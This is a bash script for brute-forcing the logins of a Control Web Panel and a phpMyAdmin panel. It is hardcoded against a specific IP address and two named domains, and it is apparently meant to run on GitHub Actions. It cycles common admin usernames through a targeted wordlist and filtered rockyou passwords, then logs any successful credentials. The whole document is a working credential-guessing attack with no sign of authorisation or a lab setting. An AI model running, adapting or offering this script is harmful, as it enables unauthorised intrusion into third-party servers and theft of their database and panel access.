#!/bin/bash
# Brute Force Script for CWP + phpMyAdmin
# Target: 103.138.96.183 (enikah.in / abdemustafa.org)
# Designed for GitHub Actions (6hr limit)

set -e

TARGET_IP="103.138.96.183"
CWP_PORT=2083
PMA_PORT=2031
RESULTS_FILE="results.txt"
LOG_FILE="bruteforce.log"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

check_cwp() {
    local user=$1
    local pass=$2
    local resp
    resp=$(curl -sk "https://${TARGET_IP}:${CWP_PORT}/login/index.php?acc=validate" \
        -d "username=${user}&password=${pass}&commit=Login" \
        --connect-timeout 5 --max-time 10 2>/dev/null)
    if echo "$resp" | grep -qi "success\|dashboard\|redirect\|welcome"; then
        return 0
    fi
    if echo "$resp" | grep -qi "failed\|error\|invalid"; then
        return 1
    fi
    return 1
}

check_pma() {
    local user=$1
    local pass=$2
    local resp
    resp=$(curl -sk "https://${TARGET_IP}:${PMA_PORT}/pma/index.php" \
        -d "pma_username=${user}&pma_password=${pass}&server=1&lang=en" \
        --connect-timeout 5 --max-time 10 2>/dev/null)
    if echo "$resp" | grep -qi "logout\|databases\|Browse\|logged_in"; then
        return 0
    fi
    if echo "$resp" | grep -qi "Cannot log in\|Access denied\|denied"; then
        return 1
    fi
    return 1
}

log "=== Brute Force Started ==="
log "Target: ${TARGET_IP}"
log "CWP Port: ${CWP_PORT}, phpMyAdmin Port: ${PMA_PORT}"

USERS=("root" "admin" "administrator" "webmaster" "cwp" "centos" "panel" "server")

# Phase 1: Targeted wordlist
log "=== Phase 1: Targeted Wordlist ($(wc -l < targeted.txt) passwords) ==="
while IFS= read -r pass; do
    for user in "${USERS[@]}"; do
        if check_cwp "$user" "$pass"; then
            log "*** CWP HIT: ${user}:${pass} ***"
            echo "CWP HIT: ${user}:${pass}" >> "$RESULTS_FILE"
            echo "***CWP***" >> "$RESULTS_FILE"
        fi
        if check_pma "$user" "$pass"; then
            log "*** phpMyAdmin HIT: ${user}:${pass} ***"
            echo "phpMyAdmin HIT: ${user}:${pass}" >> "$RESULTS_FILE"
            echo "***PMA***" >> "$RESULTS_FILE"
        fi
        sleep 0.2
    done
done < targeted.txt

# Phase 2: Filtered rockyou (8-16 chars, common patterns)
log "=== Phase 2: Filtered Rockyou ==="
if [ -f /usr/share/wordlists/rockyou.txt ]; then
    # Filter: 8-16 chars, common patterns
    grep -E '^[A-Za-z0-9!@#$%^&*]{8,16}$' /usr/share/wordlists/rockyou.txt | \
    head -50000 > /tmp/bruteforce/rockyou_filtered.txt
    
    log "Filtered rockyou: $(wc -l < /tmp/bruteforce/rockyou_filtered.txt) passwords"
    
    while IFS= read -r pass; do
        for user in "${USERS[@]}"; do
            if check_cwp "$user" "$pass"; then
                log "*** CWP HIT: ${user}:${pass} ***"
                echo "CWP HIT: ${user}:${pass}" >> "$RESULTS_FILE"
                echo "***CWP***" >> "$RESULTS_FILE"
            fi
            if check_pma "$user" "$pass"; then
                log "*** phpMyAdmin HIT: ${user}:${pass} ***"
                echo "phpMyAdmin HIT: ${user}:${pass}" >> "$RESULTS_FILE"
                echo "***PMA***" >> "$RESULTS_FILE"
            fi
            sleep 0.2
        done
    done < /tmp/bruteforce/rockyou_filtered.txt
fi

log "=== Brute Force Complete ==="
log "Results: $(cat $RESULTS_FILE 2>/dev/null | wc -l) hits"
cat "$RESULTS_FILE" 2>/dev/null || log "No results found"
